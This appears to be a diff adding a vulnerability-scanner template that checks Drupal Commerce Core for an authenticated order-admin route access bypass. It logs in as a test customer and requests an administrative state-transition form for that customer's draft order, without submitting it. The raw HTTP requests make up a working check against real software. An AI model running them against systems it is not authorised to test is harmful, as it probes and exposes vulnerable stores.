@@ -1,0 +1,96 @@
+id: CVE-2026-118539
+
+info:
+  name: Drupal Commerce Core < 3.3.13 / < 8.x-2.41 - Order Admin Route Access Bypass
+  author: alex700,dpuccetti,marcus_johansson,rsnyd
+  severity: critical
+  description: |
+    Drupal Commerce Core before 3.3.13 on the 3.x branch and before 8.x-2.41
+    on the 2.x branch does not sufficiently protect certain routes and entity
+    fields. This template tests one affected behavior: an authenticated customer
+    who owns a draft cart order can read its administrative state-transition
+    confirmation form without the Commerce administration permission. A test
+    customer and that customer's existing draft order ID are required.
+  impact: |
+    A customer may reach order administration routes that should require
+    Commerce administration access. The advisory also reports possible
+    financial impact; this template does not submit the transition form.
+  remediation: |
+    Upgrade Commerce Core 3.x to 3.3.13 or the earlier branch to 8.x-2.41.
+    Review orders for inconsistencies as advised by Drupal.
+  reference:
+    - https://www.drupal.org/sa-contrib-2026-254
+    - https://www.drupal.org/project/commerce/releases/3.3.13
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-118539
+  classification:
+    cve-id: CVE-2026-118539
+    cwe-id: CWE-862
+  metadata:
+    verified: true
+    vendor: drupal
+    product: commerce_core
+  tags: cve,cve2026,drupal,commerce,access-bypass,authenticated
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+http:
+  - raw:
+      - |
+        GET /user/login HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "user_login_form")'
+        internal: true
+    extractors:
+      - type: regex
+        name: form_build_id
+        part: body
+        group: 1
+        regex:
+          - 'name="form_build_id" value="([^"]+)"'
+        internal: true
+
+  - raw:
+      - |
+        POST /user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        name={{url_encode(username)}}&pass={{url_encode(password)}}&form_build_id={{form_build_id}}&form_id=user_login_form&op=Log+in
+
+    redirects: true
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "Log out")'
+        internal: true
+
+  - raw:
+      - |
+        GET /admin/commerce/config/orders HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers:
+      - type: status
+        status:
+          - 403
+        internal: true
+
+  - raw:
+      - |
+        GET /admin/commerce/orders/{{order_id}}/state/place HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "name=\"form_id\" value=\"commerce_order_default_state-transition-confirm_form\"")'
+        condition: and
